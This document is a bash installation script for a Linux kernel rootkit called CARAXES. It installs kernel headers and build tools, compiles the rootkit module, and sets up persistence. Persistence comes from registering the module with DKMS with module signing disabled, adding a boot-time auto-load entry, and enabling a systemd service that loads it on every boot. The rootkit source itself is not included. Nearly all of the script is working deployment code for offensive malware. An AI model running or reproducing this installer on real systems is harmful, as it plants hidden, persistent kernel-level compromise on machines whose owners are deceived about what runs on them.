#!/bin/bash

# CARAXES Rootkit Installation Script
# This script installs necessary dependencies and compiles the rootkit

set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Function to detect Linux distribution
detect_distro() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        DISTRO=$ID
        VERSION=$VERSION_ID
    elif [ -f /etc/redhat-release ]; then
        DISTRO="rhel"
    elif [ -f /etc/debian_version ]; then
        DISTRO="debian"
    else
        DISTRO="unknown"
    fi
    
    print_status "Detected distribution: $DISTRO"
}

# Function to install dependencies based on distribution
install_dependencies() {
    print_status "Installing kernel headers and build dependencies..."
    
    case $DISTRO in
        "ubuntu"|"debian")
            print_status "Installing dependencies for Debian/Ubuntu..."
            sudo apt update
            sudo apt install -y \
                linux-headers-$(uname -r) \
                build-essential \
                make \
                gcc \
                git \
                kmod \
                dkms
            ;;
        "fedora"|"rhel"|"centos"|"rocky"|"almalinux")
            print_status "Installing dependencies for RHEL/Fedora/CentOS..."
            if command -v dnf &> /dev/null; then
                sudo dnf install -y \
                    kernel-headers-$(uname -r) \
                    kernel-devel-$(uname -r) \
                    gcc \
                    make \
                    git \
                    kmod \
                    dkms
            else
                sudo yum install -y \
                    kernel-headers-$(uname -r) \
                    kernel-devel-$(uname -r) \
                    gcc \
                    make \
                    git \
                    kmod \
                    dkms
            fi
            ;;
        "arch"|"manjaro")
            print_status "Installing dependencies for Arch Linux..."
            sudo pacman -S --needed \
                linux-headers \
                base-devel \
                git \
                kmod \
                dkms
            ;;
        "opensuse"|"sles")
            print_status "Installing dependencies for openSUSE..."
            sudo zypper install -y \
                kernel-default-devel \
                gcc \
                make \
                git \
                kmod \
                dkms
            ;;
        *)
            print_warning "Unknown distribution. Please install the following manually:"
            echo "  - Kernel headers for $(uname -r)"
            echo "  - build-essential/gcc/make"
            echo "  - git"
            echo "  - kmod"
            read -p "Press Enter to continue after installing dependencies..."
            ;;
    esac
}

# Function to check if kernel headers are properly installed
check_kernel_headers() {
    print_status "Checking kernel headers..."
    
    KERNEL_VERSION=$(uname -r)
    HEADERS_PATH="/lib/modules/$KERNEL_VERSION/build"
    
    if [ ! -d "$HEADERS_PATH" ]; then
        print_error "Kernel headers not found at $HEADERS_PATH"
        print_error "Please install kernel headers for your current kernel: $KERNEL_VERSION"
        exit 1
    fi
    
    if [ ! -f "$HEADERS_PATH/Makefile" ]; then
        print_error "Kernel headers appear to be incomplete (no Makefile found)"
        exit 1
    fi
    
    print_success "Kernel headers found and appear to be complete"
}

# Function to check if we're running as root for module operations
check_root_for_module() {
    if [ "$EUID" -eq 0 ]; then
        print_warning "Running as root. This is required for loading/unloading kernel modules."
        return 0
    else
        print_warning "Not running as root. You'll need sudo privileges to load/unload the module."
        return 1
    fi
}

# Function to clean previous builds
clean_build() {
    print_status "Cleaning previous builds..."
    if [ -f "Makefile" ]; then
        make clean 2>/dev/null || true
    fi
    rm -f *.ko *.o *.mod.c *.mod *.symvers *.order .*.cmd 2>/dev/null || true
    rm -rf .tmp_versions/ 2>/dev/null || true
}

# Function to compile the rootkit
compile_rootkit() {
    print_status "Compiling CARAXES rootkit..."
    
    if [ ! -f "Makefile" ]; then
        print_error "Makefile not found in current directory"
        exit 1
    fi
    
    if [ ! -f "caraxes.c" ]; then
        print_error "caraxes.c not found in current directory"
        exit 1
    fi
    
    # Compile
    make
    
    if [ -f "caraxes.ko" ]; then
        print_success "Compilation successful! caraxes.ko created."
    else
        print_error "Compilation failed. caraxes.ko not found."
        exit 1
    fi
}

# Function to install module using DKMS for persistence
install_module_dkms() {
    print_status "Installing module using DKMS for persistence..."
    
    MODULE_NAME="caraxes"
    MODULE_VERSION="1.0"
    SRC_DIR=$(pwd)
    DKMS_DIR="/usr/src/${MODULE_NAME}-${MODULE_VERSION}"
    
    # Prepare DKMS source directory
    print_status "Preparing DKMS source directory..."
    sudo rm -rf "$DKMS_DIR"
    sudo mkdir -p "$DKMS_DIR"

    print_status "Copying source files..."
    sudo cp -r "$SRC_DIR"/* "$DKMS_DIR"

    print_status "Creating dkms.conf..."
    sudo tee "$DKMS_DIR/dkms.conf" > /dev/null <<EOF
PACKAGE_NAME="${MODULE_NAME}"
PACKAGE_VERSION="${MODULE_VERSION}"
BUILT_MODULE_NAME[0]="${MODULE_NAME}"
DEST_MODULE_LOCATION[0]="/updates/dkms"
AUTOINSTALL="yes"
MAKE[0]="make CONFIG_MODULE_SIG=n -C \${kernel_source_dir} M=\${dkms_tree}/\${PACKAGE_NAME}/\${PACKAGE_VERSION}/build modules"
CLEAN="make -C \${kernel_source_dir} M=\${dkms_tree}/\${PACKAGE_NAME}/\${PACKAGE_VERSION}/build clean"
EOF

    print_status "Cleaning previous DKMS module if exists..."
    sudo dkms remove -m "$MODULE_NAME" -v "$MODULE_VERSION" --all || true

    print_status "Adding, building, and installing module via DKMS..."
    sudo dkms add -m "$MODULE_NAME" -v "$MODULE_VERSION"
    sudo dkms build -m "$MODULE_NAME" -v "$MODULE_VERSION"
    sudo dkms install -m "$MODULE_NAME" -v "$MODULE_VERSION"

    # Auto-load using /etc/modules-load.d
    print_status "Configuring module to auto-load at boot via modules-load.d..."
    echo "$MODULE_NAME" | sudo tee "/etc/modules-load.d/${MODULE_NAME}.conf" > /dev/null

    # Add systemd service as fallback
    print_status "Creating systemd service to load module..."
    sudo tee "/etc/systemd/system/load_${MODULE_NAME}.service" > /dev/null <<EOF
[Unit]
Description=Load ${MODULE_NAME} module at boot
After=network.target

[Service]
Type=oneshot
ExecStart=/sbin/modprobe ${MODULE_NAME}
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

    sudo systemctl daemon-reexec
    sudo systemctl daemon-reload
    sudo systemctl enable load_${MODULE_NAME}.service

    print_status "Loading module now..."
    if sudo modprobe "$MODULE_NAME"; then
        print_success "Module loaded successfully"
    else
        print_warning "Manual load failed. Reboot will retry via systemd."
    fi

    print_success "Module '${MODULE_NAME}' loaded and configured to auto-load on boot."
}



# Check if we're in the right directory
if [ ! -f "caraxes.c" ] || [ ! -f "Makefile" ]; then
    print_error "Please run this script from the CARAXES rootkit directory"
    print_error "Required files: caraxes.c, Makefile"
    exit 1
fi

# Detect distribution
detect_distro

# Install dependencies
install_dependencies

# Check kernel headers
check_kernel_headers

# Check root privileges
check_root_for_module

# Clean previous builds
clean_build

# Compile the rootkit
compile_rootkit

# Install module using DKMS
install_module_dkms
